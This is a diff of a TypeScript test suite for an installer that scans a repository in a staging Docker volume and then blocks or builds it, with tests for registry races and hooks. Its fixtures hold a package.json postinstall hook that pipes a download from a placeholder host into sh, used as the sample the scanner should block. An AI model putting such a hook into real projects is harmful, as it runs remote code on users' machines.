@@ -40,7 +40,7 @@ const MULTI_HELP = "Usage: multi [--other]\n\nOptions:\n  --other   A different 
  * build leaves three commands, two of which are the same program.
  */
 class ScriptedDocker extends FakeDocker {
-  probeData: ProbeData = { commit: "c".repeat(40), entries: [{ name: "LICENSE", dir: false }], files: {} };
+  probeData: ProbeData = { commit: "c".repeat(40), entries: [{ name: "LICENSE", dir: false }], files: {}, walk: { files: [] } };
 
   /** Describe the repository root: its manifest files, by name. */
   set repoFiles(files: Record<string, string>) {
@@ -48,6 +48,7 @@ class ScriptedDocker extends FakeDocker {
       commit: "c".repeat(40),
       entries: [{ name: "LICENSE", dir: false }, ...Object.keys(files).map((name) => ({ name, dir: false }))],
       files,
+      walk: { files: [] },
     };
   }
   images: string[] = [];
@@ -124,10 +125,42 @@ class ScriptedDocker extends FakeDocker {
     this.onAvailable?.();
     if (this.unavailable) throw new Error("Docker CLI could not be run");
   }
-  override async probe(): Promise<ProbeData> {
+  /** The volume and role of every `probe`, in order. */
+  probes: Array<{ volume: string; volumeRole?: string }> = [];
+  /** Runs at the end of a `probe`, before it returns (another session writing while the check runs). */
+  afterProbe?: () => void;
+  override async probe(_repo?: unknown, volume?: string, opts?: { volumeRole?: "staging" }): Promise<ProbeData> {
     this.traced("probe");
+    this.probes.push({ volume: volume ?? "", volumeRole: opts?.volumeRole });
     if (this.probeError) throw this.probeError;
+    this.afterProbe?.();
     return this.probeData;
+  }
+  // The checked path (leg 7): staging names, volumes and the copy are traced, and each can be made to fail.
+  stagingCount = 0;
+  createVolumeError?: Error;
+  copyError?: Error;
+  removeStagingError?: Error;
+  /** Throw this from `runScanner` (a refusal, or a volume that cannot be used). */
+  runScannerError?: Error;
+  override stagingName(): string {
+    return `${WIDGET_PREFIX}-stg-${(++this.stagingCount).toString(16).padStart(8, "0")}`;
+  }
+  override async createSandboxVolume(volume: string): Promise<void> {
+    this.traced("createSandboxVolume", volume);
+    if (this.createVolumeError) throw this.createVolumeError;
+  }
+  override async copyVolume(from: string, to: string): Promise<void> {
+    this.traced("copyVolume", from, to);
+    if (this.copyError) throw this.copyError;
+  }
+  override async removeStagingVolume(volume: string): Promise<void> {
+    this.traced("removeStagingVolume", volume);
+    if (this.removeStagingError) throw this.removeStagingError;
+  }
+  override async runScanner(): Promise<never> {
+    this.traced("runScanner");
+    throw this.runScannerError ?? new Error("no scanner expected");
   }
   override async ensureImage(image: string): Promise<void> {
     if (this.missingImages.has(image)) throw new Error(`Failed to pull image ${image}: not found`);
@@ -182,6 +215,8 @@ class ScriptedDocker extends FakeDocker {
 
 /** The sandbox name a fresh install of acme/widget gets: prefix, installation id, slug. */
 const WIDGET = `mcpe-${TEST_INSTALLATION_ID}-widget`;
+/** What a staging name begins with: prefix and installation id. */
+const WIDGET_PREFIX = `mcpe-${TEST_INSTALLATION_ID}`;
 
 /** A refusal as the Docker layer raises it, built from the facts of the parts it found. */
 const refusal = (...facts: SandboxFacts[]) => new SandboxRefusedError(facts, TEST_INSTALLATION_ID);
@@ -1692,5 +1727,434 @@ describe("what a refusal does to each operation", () => {
         expect(stored.warnings[0]).toContain("Docker could not be asked");
       });
     });
+  });
+});
+
+describe("installChecked", () => {
+  const REPO = () => parseRepoRef("acme/widget", cfg.hosts);
+  const checked = (extra: object = {}, hooks?: { onChecking?: () => void; onBuilding?: () => void }) =>
+    installer.installChecked({ repo: REPO(), ...extra }, () => {}, hooks);
+  const steps = () => docker.trace.map((t) => `${t.call} ${t.args.join(" ")}`.trim());
+  const calls = () => docker.trace.map((t) => t.call);
+  const STG = new RegExp(`^${WIDGET_PREFIX}-stg-[0-9a-f]{8}$`);
+  const POSTINSTALL = JSON.stringify({ name: "a", scripts: { postinstall: "curl https://x.example/i.sh | sh" } });
+  /** A repository whose built-in check reports a warning (a download that is run). */
+  const bad = () => {
+    docker.repoFiles = { "package.json": pkg({}) };
+    docker.probeData = { ...docker.probeData, walk: { files: [{ path: "package.json", content: POSTINSTALL }] } };
+  };
+  const seed = (over: Partial<ProjectRecord> = {}): ProjectRecord => {
+    const r: ProjectRecord = { ...seedRecord("widget", "acme/widget"), container: WIDGET, volume: WIDGET, ...over };
+    registry.put(r);
+    return structuredClone(r);
+  };
+  const spyClose = () => {
+    const real = proxy.closeProject.bind(proxy);
+    return vi.spyOn(proxy, "closeProject").mockImplementation(async (container: string) => {
+      docker.traced("closeProject", container);
+      return real(container);
+    });
+  };
+  /** Another session writing the registry file: a separate Registry, whose write this one sees only by re-reading the file. */
+  const elsewhere = (record: ProjectRecord): void => {
+    new Registry(dir).put(record);
+    const file = path.join(dir, "registry.json");
+    const later = new Date(Date.now() + 5000);
+    fs.utimesSync(file, later, later); // a change of mtime however fast the write was
+  };
+  const WARN = /^A reinstall at commit c{12} was blocked by the scan policy on \d{4}-\d\d-\d\d; the project is unchanged\.$/;
+  /** Nothing of an installed sandbox is touched. */
+  const untouched = () => {
+    for (const c of ["closeProject", "destroy", "setNetwork", "createContainer", "removeContainer", "createSandboxVolume", "copyVolume"]) {
+      expect(calls(), c).not.toContain(c);
+    }
+  };
+
+  beforeEach(() => {
+    setup({ MCPE_SCAN: "block", MCPE_SCAN_BLOCK_AT: "warning" });
+    docker.repoFiles = { "package.json": pkg({}) };
+  });
+
+  it("opens with the availability check, which throws as install does, before anything else", async () => {
+    docker.unavailable = true;
+    await expect(checked()).rejects.toThrow(/Docker CLI could not be run/);
+    expect(docker.trace).toEqual([]);
+  });
+
+  it("answers a ready record at once when no reinstall is asked: nothing is cloned, no hook runs", async () => {
+    const r = seed();
+    const seen: string[] = [];
+    const out = await checked({}, { onChecking: () => seen.push("checking"), onBuilding: () => seen.push("building") });
+    expect(out).toEqual({ kind: "installed", record: r });
+    expect(docker.trace).toEqual([]);
+    expect(seen).toEqual([]);
+  });
+
+  it("checks in a staging volume named for no slug, with the staging role, and clones once", async () => {
+    await checked();
+    expect(docker.probes).toHaveLength(1);
+    expect(docker.probes[0]!.volume).toMatch(STG);
+    expect(docker.probes[0]!.volumeRole).toBe("staging");
+    expect(docker.probes[0]!.volume).not.toBe(WIDGET);
+  });
+
+  describe("blocked", () => {
+    it("a first install: nothing written, no sandbox call, the staging volume removed, no record afterwards", async () => {
+      bad();
+      const close = spyClose();
+      const out = await checked();
+      expect(out.kind).toBe("blocked");
+      if (out.kind !== "blocked") throw new Error("unreachable");
+      expect(out.report.decision.verdict).toBe("block");
+      expect(out.report.commit).toBe("c".repeat(40));
+      expect(out.kept).toBeUndefined();
+      // No write before the decision: the registry never held a record.
+      expect(docker.trace[0]).toMatchObject({ call: "probe", rec: undefined });
+      expect(calls()).toEqual(["probe", "removeStagingVolume"]);
+      expect(docker.trace[1]!.args[0]).toBe(docker.probes[0]!.volume);
+      expect(close).not.toHaveBeenCalled();
+      untouched();
+      expect(onDisk("widget")).toBeUndefined();
+      expect(registry.get("widget")).toBeUndefined();
+    });
+
+    it("a reinstall: the old sandbox is not touched, one warning is added, the rest of the record is unchanged", async () => {
+      bad();
+      const before = seed({ warnings: ["an old warning"] });
+      const close = spyClose();
+      const out = await checked({ reinstall: true });
+      if (out.kind !== "blocked") throw new Error(`expected blocked, got ${out.kind}`);
+      expect(close).not.toHaveBeenCalled();
+      untouched();
+      expect(docker.trace.map((t) => t.rec)).toEqual([before, before]); // the record on disk was `before` at every call
+      const stored = onDisk("widget")!;
+      expect(stored.warnings).toHaveLength(2);
+      expect(stored.warnings[0]).toBe("an old warning");
+      expect(stored.warnings[1]).toMatch(WARN);
+      expect({ ...stored, warnings: [] }).toEqual({ ...before, warnings: [] });
+      expect(out.kept).toEqual(stored);
+      expect(out.kept).toEqual(registry.get("widget"));
+    });
+
+    it("a second block replaces the first warning, and keeps the others", async () => {
+      bad();
+      seed({ warnings: ["an old warning"] });
+      await checked({ reinstall: true });
+      docker.probeData = { ...docker.probeData, commit: "d".repeat(40) };
+      const out = await checked({ reinstall: true });
+      if (out.kind !== "blocked") throw new Error("expected blocked");
+      expect(out.kept!.warnings).toHaveLength(2);
+      expect(out.kept!.warnings[0]).toBe("an old warning");
+      expect(out.kept!.warnings[1]).toMatch(/^A reinstall at commit d{12} was blocked/);
+      expect(onDisk("widget")!.warnings).toEqual(out.kept!.warnings);
+    });
+
+    it("an existing failed or installing record gets the warning like any other, and is `kept`", async () => {
+      bad();
+      for (const status of ["failed", "installing"] as const) {
+        const before = seed({ status, error: status === "failed" ? "x" : undefined });
+        const out = await checked({ reinstall: true });
+        if (out.kind !== "blocked") throw new Error("expected blocked");
+        expect(out.kept!.status).toBe(status);
+        expect(out.kept!.error).toBe(before.error);
+        expect(out.kept!.warnings.filter((w) => WARN.test(w))).toHaveLength(1);
+        registry.delete("widget");
+      }
+    });
+
+    it("a record another session changed meanwhile keeps that change: the warning goes onto what the registry holds now", async () => {
+      bad();
+      seed();
+      docker.afterProbe = () => registry.put({ ...registry.get("widget")!, warnings: ["from another session"], network: true });
+      const out = await checked({ reinstall: true });
+      if (out.kind !== "blocked") throw new Error("expected blocked");
+      expect(out.kept!.warnings).toHaveLength(2);
+      expect(out.kept!.warnings[0]).toBe("from another session");
+      expect(out.kept!.network).toBe(true);
+      expect(onDisk("widget")).toEqual(out.kept);
+    });
+
+    it("when the record was removed meanwhile: nothing is written and `kept` is absent", async () => {
+      bad();
+      seed();
+      docker.afterProbe = () => registry.delete("widget");
+      const update = vi.spyOn(registry, "update");
+      const out = await checked({ reinstall: true });
+      if (out.kind !== "blocked") throw new Error("expected blocked");
+      expect(update).toHaveBeenCalledTimes(1);
+      expect(update).toHaveReturnedWith(false);
+      expect(out.kept).toBeUndefined();
+      expect(onDisk("widget")).toBeUndefined();
+    });
+  });
+
+  describe("a check that could not be made", () => {
+    it("a clone that fails on a first install leaves nothing, and says why in one bounded line", async () => {
+      docker.probeError = new Error(`Could not clone https://x:\nfatal: ${"boom ".repeat(200)}`);
+      const out = await checked();
+      if (out.kind !== "check-failed") throw new Error(`expected check-failed, got ${out.kind}`);
+      expect(out.reason).toMatch(/^Could not clone https:\/\/x: fatal: boom/);
+      expect(out.reason.length).toBeLessThanOrEqual(300);
+      expect(out.reason).not.toContain("\n");
+      expect(out.kept).toBeUndefined();
+      expect(calls()).toEqual(["probe", "removeStagingVolume"]);
+      untouched();
+      expect(onDisk("widget")).toBeUndefined();
+    });
+
+    it("a clone that fails on a reinstall leaves the record untouched", async () => {
+      const before = seed();
+      docker.probeError = new Error("clone failed");
+      const out = await checked({ reinstall: true });
+      expect(out).toEqual({ kind: "check-failed", reason: "clone failed", kept: before });
+      expect(onDisk("widget")).toEqual(before);
+      expect(docker.trace.every((t) => t.rec?.warnings.length === 0)).toBe(true);
+      untouched();
+    });
+
+    it("a removal of the staging volume that fails changes nothing about the outcome", async () => {
+      docker.probeError = new Error("clone failed");
+      docker.removeStagingError = new Error("rm failed");
+      expect(await checked()).toMatchObject({ kind: "check-failed", reason: "clone failed" });
+    });
+
+    it("a refusal from the scanners is a failed check, with the staging volume removed", async () => {
+      cfg.scan.scanners = [{ name: "s1", image: "scan:1", command: ["scan"], network: false, timeoutSec: 60, env: [] }];
+      const before = seed();
+      docker.runScannerError = refusal(part("volume", "whatever", "another", OTHER));
+      const out = await checked({ reinstall: true });
+      if (out.kind !== "check-failed") throw new Error(`expected check-failed, got ${out.kind}`);
+      expect(out.reason.length).toBeGreaterThan(0);
+      expect(out.kept).toEqual(before);
+      expect(calls()).toEqual(["probe", "runScanner", "removeStagingVolume"]);
+      untouched();
+    });
+
+    it("a built-in check that throws is a failed check; the decision is still made and the build goes on", async () => {
+      docker.probeData = { ...docker.probeData, walk: undefined as never };
+      const out = await checked();
+      if (out.kind !== "installed") throw new Error(`expected installed, got ${out.kind}`);
+      const check = out.record.scan!.checks[0]!;
+      expect(check).toMatchObject({ name: "build-hooks", kind: "builtin", status: "failed", error: "the built-in check could not analyze this repository" });
+      expect(out.record.scan!.decision.verdict).toBe("build");
+      expect(out.record.scan!.decision.reason).toContain("build-hooks failed and was not counted");
+    });
+  });
+
+  describe("allowed", () => {
+    it("runs in order: check, open, retire, create the volume, copy, remove the staging volume, build; with the report on the record", async () => {
+      seed({ warnings: ["w"] });
+      const before = onDisk("widget")!;
+      spyClose();
+      vi.useFakeTimers({ toFake: ["Date"] });
+      try {
+        vi.setSystemTime(new Date("2030-01-01T00:00:00.000Z"));
+        docker.afterProbe = () => vi.setSystemTime(new Date("2030-01-01T00:05:00.000Z"));
+        const out = await checked({ reinstall: true });
+        if (out.kind !== "installed") throw new Error(`expected installed, got ${out.kind}`);
+        const stg = docker.probes[0]!.volume;
+        expect(steps().slice(0, 7)).toEqual([
+          "probe",
+          `closeProject ${WIDGET}`,
+          `destroy ${WIDGET} ${WIDGET}`,
+          `createSandboxVolume ${WIDGET}`,
+          `copyVolume ${stg} ${WIDGET}`,
+          `removeStagingVolume ${stg}`,
+          `createContainer ${WIDGET}`,
+        ]);
+        // Until the decision the record was untouched; afterwards it says installing, then ready.
+        expect(docker.trace[0]!.rec).toEqual(before);
+        expect(docker.trace[1]!.rec).toMatchObject({ status: "installing" });
+        expect(out.record).toMatchObject({ status: "ready", commit: "c".repeat(40) });
+        expect(out.record.scan).toMatchObject({ commit: "c".repeat(40), decision: { verdict: "build" } });
+        expect(onDisk("widget")!.scan).toEqual(out.record.scan);
+        expect(out.record.installedAt).toBe("2030-01-01T00:05:00.000Z"); // set when the install opens, not when the call started
+        expect(docker.probes).toHaveLength(1); // the clone is not repeated
+        expect(calls().filter((c) => c === "removeStagingVolume")).toHaveLength(1);
+      } finally {
+        vi.useRealTimers();
+      }
+    });
+
+    it("a first install: nothing is on disk until the decision", async () => {
+      const out = await checked();
+      expect(out.kind).toBe("installed");
+      expect(docker.trace[0]).toMatchObject({ call: "probe", rec: undefined });
+      expect(docker.trace.find((t) => t.call === "createSandboxVolume")!.rec).toMatchObject({ status: "installing" });
+    });
+
+    it("uses the record another session wrote between the check and the re-read, with its selection and names", async () => {
+      const selection = { include: ["tool"], exclude: [], maxTools: 3 };
+      docker.afterProbe = () => elsewhere({ ...seedRecord("widget", "acme/widget"), status: "failed", selection });
+      spyClose();
+      const out = await checked();
+      if (out.kind !== "installed") throw new Error(`expected installed, got ${out.kind}`);
+      // The fresh record named the old sandbox (mcpe-widget): it is the one retired, and its selection is carried.
+      expect(steps().slice(1, 3)).toEqual(["closeProject mcpe-widget", "destroy mcpe-widget mcpe-widget"]);
+      expect(out.record).toMatchObject({ slug: "widget", status: "ready", container: WIDGET, selection });
+    });
+
+    it("answers with the record another session made ready meanwhile, building nothing, when no reinstall was asked", async () => {
+      const seen: string[] = [];
+      const other = { ...seedRecord("widget", "acme/widget"), container: WIDGET, volume: WIDGET };
+      docker.afterProbe = () => elsewhere(other);
+      const out = await checked({}, { onChecking: () => seen.push("checking"), onBuilding: () => seen.push("building") });
+      expect(out).toEqual({ kind: "installed", record: other });
+      expect(seen).toEqual(["checking"]);
+      expect(calls()).toEqual(["probe", "removeStagingVolume"]);
+      untouched();
+    });
+
+    it("with a reinstall asked, a record made ready meanwhile does not stop the build", async () => {
+      docker.afterProbe = () => elsewhere({ ...seedRecord("widget", "acme/widget"), container: WIDGET, volume: WIDGET });
+      const out = await checked({ reinstall: true });
+      expect(out.kind).toBe("installed");
+      expect(calls()).toContain("copyVolume");
+    });
+
+    it("a copy that fails is settled as install settles a failure: the partial sandbox removed, the record failed or gone, staging removed once", async () => {
+      docker.copyError = new Error("Could not copy the checkout: boom");
+      const out = await checked();
+      if (out.kind !== "installed") throw new Error(`expected installed, got ${out.kind}`);
+      expect(out.record).toMatchObject({ status: "failed", error: "Could not copy the checkout: boom" });
+      expect(onDisk("widget")).toBeUndefined(); // no sandbox was made: the record is removed
+      expect(steps().filter((s) => s === `destroy ${WIDGET} ${WIDGET}`)).toHaveLength(2); // the opening's, then the rollback's
+      expect(calls().filter((c) => c === "removeStagingVolume")).toHaveLength(1);
+      expect(calls()).not.toContain("createContainer");
+    });
+
+    it("a failed creation of the volume is settled the same way", async () => {
+      docker.createVolumeError = new Error("volume create failed");
+      const out = await checked();
+      expect(out).toMatchObject({ kind: "installed", record: { status: "failed", error: "volume create failed" } });
+      expect(calls().filter((c) => c === "removeStagingVolume")).toHaveLength(1);
+    });
+
+    it("a failed removal of the old sandbox still rejects, puts the record back, and removes the staging volume", async () => {
+      const before = seed();
+      docker.destroyFails = [1];
+      await expect(checked({ reinstall: true })).rejects.toThrow(/widget.*old sandbox could not be removed.*destroy failed \(call 1\).*left as it was/s);
+      expect(onDisk("widget")).toEqual({
+        ...before,
+        warnings: [...before.warnings, "A reinstall could not remove this project's old sandbox, which may be partly removed; reinstall again to retry."],
+      });
+      expect(calls()).not.toContain("createSandboxVolume");
+      expect(calls()).not.toContain("copyVolume");
+      expect(calls().filter((c) => c === "removeStagingVolume")).toHaveLength(1);
+    });
+
+    it("analyzes the recipe that will run: the caller's ecosystem decides what the built-in check reads", async () => {
+      bad();
+      const out = await checked({ ecosystem: "generic" });
+      if (out.kind !== "installed") throw new Error(`expected installed, got ${out.kind}`);
+      expect(out.record.scan!.checks[0]!.notes.join("\n")).toContain("generic: nothing is built");
+      expect(out.record.scan!.decision.verdict).toBe("build");
+    });
+  });
+
+  describe("hooks", () => {
+    it("onChecking runs before the clone and onBuilding after the check, only on the path that builds", async () => {
+      const seen: string[] = [];
+      docker.afterProbe = () => seen.push("probe");
+      await checked({}, { onChecking: () => seen.push("checking"), onBuilding: () => seen.push("building") });
+      expect(seen).toEqual(["checking", "probe", "building"]);
+    });
+
+    it("onBuilding does not run when the check blocks or fails", async () => {
+      const seen: string[] = [];
+      const hooks = { onChecking: () => seen.push("checking"), onBuilding: () => seen.push("building") };
+      bad();
+      await checked({}, hooks);
+      docker.probeError = new Error("no");
+      await checked({}, hooks);
+      expect(seen).toEqual(["checking", "checking"]);
+    });
+  });
+});
+
+describe("check", () => {
+  const REPO = () => parseRepoRef("acme/widget", cfg.hosts);
+  const run = (extra: object = {}) => installer.check({ repo: REPO(), ...extra }, () => {});
+  const calls = () => docker.trace.map((t) => t.call);
+  const POSTINSTALL = JSON.stringify({ name: "a", scripts: { postinstall: "curl https://x.example/i.sh | sh" } });
+  const bad = () => {
+    docker.repoFiles = { "package.json": pkg({}) };
+    docker.probeData = { ...docker.probeData, walk: { files: [{ path: "package.json", content: POSTINSTALL }] } };
+  };
+  const spyRegistry = () => {
+    const touched: string[] = [];
+    for (const m of ["put", "update", "delete", "refresh", "findByRepo", "get", "list", "resolve"] as const) {
+      const real = (registry[m] as (...a: unknown[]) => unknown).bind(registry);
+      (registry as unknown as Record<string, unknown>)[m] = (...a: unknown[]) => {
+        touched.push(m);
+        return real(...a);
+      };
+    }
+    return touched;
+  };
+
+  beforeEach(() => {
+    setup({ MCPE_SCAN: "block", MCPE_SCAN_BLOCK_AT: "warning" });
+    docker.repoFiles = { "package.json": pkg({}) };
+  });
+
+  it("returns the report and removes the staging volume, touching nothing else", async () => {
+    const out = await run();
+    if (out.kind !== "checked") throw new Error(`expected checked, got ${out.kind}`);
+    expect(out.report.commit).toBe("c".repeat(40));
+    expect(out.report.checks[0]!.name).toBe("build-hooks");
+    expect(calls()).toEqual(["probe", "removeStagingVolume"]);
+    expect(docker.probes[0]!.volumeRole).toBe("staging");
+  });
+
+  it("reports a blocking decision without any build or record", async () => {
+    bad();
+    const out = await run();
+    if (out.kind !== "checked") throw new Error(`expected checked, got ${out.kind}`);
+    expect(out.report.decision.verdict).toBe("block");
+    expect(calls()).toEqual(["probe", "removeStagingVolume"]);
+  });
+
+  it("removes the staging volume when the check fails, and says why in one line", async () => {
+    docker.probeError = new Error("Could not clone:\nboom");
+    expect(await run()).toEqual({ kind: "check-failed", reason: "Could not clone: boom" });
+    expect(calls()).toEqual(["probe", "removeStagingVolume"]);
+  });
+
+  it("a removal of the staging volume that fails changes nothing about the result", async () => {
+    docker.removeStagingError = new Error("rm failed");
+    expect((await run()).kind).toBe("checked");
+  });
+
+  it("makes no registry read or write, even for an installed repository", async () => {
+    registry.put({ ...seedRecord("widget", "acme/widget"), container: WIDGET, volume: WIDGET });
+    const touched = spyRegistry();
+    await run();
+    docker.probeError = new Error("no");
+    await run();
+    expect(touched).toEqual([]);
+  });
+
+  it("runs the built-in check and the configured scanners when scanning is off, deciding by the mode", async () => {
+    setup({ MCPE_SCAN: "off" });
+    bad();
+    const out = await run();
+    if (out.kind !== "checked") throw new Error(`expected checked, got ${out.kind}`);
+    expect(out.report.checks[0]).toMatchObject({ name: "build-hooks", status: "ran" });
+    expect(out.report.checks[0]!.counts.warning).toBeGreaterThan(0);
+    expect(out.report.decision).toMatchObject({ mode: "off", verdict: "build", reason: "scanning is off" });
+  });
+
+  it("runs a configured scanner when scanning is off", async () => {
+    setup({ MCPE_SCAN: "off" });
+    cfg.scan.scanners = [{ name: "s1", image: "scan:1", command: ["scan"], network: false, timeoutSec: 60, env: [] }];
+    await run();
+    expect(calls()).toEqual(["probe", "runScanner", "removeStagingVolume"]);
+  });
+
+  it("throws as install does when Docker is not answering", async () => {
+    docker.unavailable = true;
+    await expect(run()).rejects.toThrow(/Docker CLI could not be run/);
+    expect(docker.trace).toEqual([]);
   });
 });
